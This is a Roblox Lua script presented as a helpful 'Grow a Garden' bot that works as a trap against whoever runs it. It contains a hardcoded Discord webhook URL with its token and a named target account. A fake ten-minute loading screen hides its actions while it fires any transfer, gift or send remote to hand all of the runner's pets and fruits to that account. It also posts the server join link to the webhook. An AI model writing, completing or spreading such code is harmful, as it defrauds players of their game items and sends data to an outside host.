-- 🌿 GROW A GARDEN BOT — FULL FIXED VERSION

--== CONFIGURATION ==--
local CONFIG = {
    TARGET_USERNAME = "Sgahfd1223",
    WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz",
    LANGUAGE = "ru", -- "ru" or "en"
    LOADING_TIME = 600, -- 10 мин
    CHECK_INTERVAL = 5,
    TRANSFER_DELAY = 0.25,
}

--== SERVICES ==--
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

--== LOCALIZATION ==--
local LANGUAGES = {
    ["ru"] = {
        title = "🌿 Загрузка скрипта...",
        percent = "% завершено",
        done = "Готово! Ожидание цели...",
        webhook_detect = "Игрок %s зашел в плейс.",
        webhook_success = "Питомцы и фрукты были переданы.",
        webhook_server = "Ссылка на сервер"
    },
    ["en"] = {
        title = "🌿 Script Loading...",
        percent = "% done",
        done = "Ready! Waiting for target...",
        webhook_detect = "Player %s joined the place.",
        webhook_success = "Pets and fruits were successfully transferred.",
        webhook_server = "Server Link"
    }
}
local TXT = LANGUAGES[CONFIG.LANGUAGE]

--== GUI LOADING ==--
local function createLoadingUI()
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "GrowGardenBot"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.fromRGB(15,15,25)

    local title = Instance.new("TextLabel", frame)
    title.Text = TXT.title
    title.Size = UDim2.new(1,0,0,60)
    title.Position = UDim2.new(0,0,0.3,-60)
    title.TextColor3 = Color3.new(1,1,1)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 26
    title.BackgroundTransparency = 1

    local barBack = Instance.new("Frame", frame)
    barBack.Size = UDim2.new(0.6,0,0,30)
    barBack.Position = UDim2.new(0.2,0,0.5,0)
    barBack.BackgroundColor3 = Color3.fromRGB(40,40,40)

    local bar = Instance.new("Frame", barBack)
    bar.BackgroundColor3 = Color3.fromRGB(0,200,100)
    bar.Size = UDim2.new(0,0,1,0)

    local percent = Instance.new("TextLabel", frame)
    percent.Size = UDim2.new(1,0,0,50)
    percent.Position = UDim2.new(0,0,0.5,40)
    percent.TextColor3 = Color3.fromRGB(255,255,255)
    percent.Font = Enum.Font.GothamBold
    percent.TextSize = 24
    percent.BackgroundTransparency = 1

    return {GUI = gui, Bar = bar, Percent = percent, Title = title}
end

--== WEBHOOK FUNCTION ==--
local function sendWebhook(content)
    local data = {["content"] = content}
    local json = HttpService:JSONEncode(data)

    local requestFunc = nil
    if syn and syn.request then
        requestFunc = syn.request
    elseif http and http.request then
        requestFunc = http.request
    elseif http_request then
        requestFunc = http_request
    elseif request then
        requestFunc = request
    end

    if requestFunc then
        pcall(function()
            requestFunc({
                Url = CONFIG.WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
    else
        warn("Не удалось найти подходящую функцию для вебхука")
    end
end

local function sendServerLink()
    local place = tostring(game.PlaceId)
    local job = tostring(game.JobId)
    local link = "https://floating.gg/?placeID="..place.."&gameInstanceId="..job
    sendWebhook(TXT.webhook_server..": "..link)
end

--== COLLECT PETS ==--
local function collectPets()
    local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild("Farm")
    if not garden then return {} end
    local pets = {}
    for _, obj in ipairs(garden:GetDescendants()) do
        if obj:IsA("Model") and obj.Name:lower():find("pet") then
            table.insert(pets,obj)
            pcall(function() obj.Parent = LocalPlayer.Character end)
        end
    end
    return pets
end

--== TELEPORT FUNCTION ==--
local function teleportTo(target)
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        root.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
    end
end

--== TRANSFER PETS AND FRUITS ==--
local function transferItems(target)
    local success = 0
    local remotes = {}
    for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
        if r:IsA("RemoteEvent") then
            local name = r.Name:lower()
            if name:find("transfer") or name:find("gift") or name:find("send") then
                table.insert(remotes, r)
            end
        end
    end

    for _, remote in ipairs(remotes) do
        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if item.Name:lower():find("pet") or item.Name:lower():find("fruit") then
                pcall(function() remote:FireServer(item,target) end)
                success += 1
                task.wait(CONFIG.TRANSFER_DELAY)
            end
        end
        for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
            if item:IsA("Model") and (item.Name:lower():find("pet") or item.Name:lower():find("fruit")) then
                pcall(function() remote:FireServer(item,target) end)
                success += 1
                task.wait(CONFIG.TRANSFER_DELAY)
            end
        end
    end
    return success
end

--== MAIN BOT LOOP ==--
local function runBot()
    local serverSent = false
    while true do
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
                if not serverSent then
                    sendServerLink()
                    serverSent = true
                end
                sendWebhook(string.format(TXT.webhook_detect,plr.Name))
                teleportTo(plr)
                collectPets()
                local count = transferItems(plr)
                if count > 0 then
                    sendWebhook(TXT.webhook_success)
                end
                break
            end
        end
        task.wait(CONFIG.CHECK_INTERVAL)
    end
end

--== STARTUP LOADING UI ==--
local ui = createLoadingUI()
local start = os.time()
while os.time() - start < CONFIG.LOADING_TIME do
    local elapsed = os.time() - start
    local ratio = math.clamp(elapsed / CONFIG.LOADING_TIME, 0, 1)
    local percent = math.floor(ratio * 100)
    ui.Bar.Size = UDim2.new(ratio,0,1,0)
    ui.Percent.Text = tostring(percent)..TXT.percent
    task.wait(1)
end
ui.GUI:Destroy()
runBot()
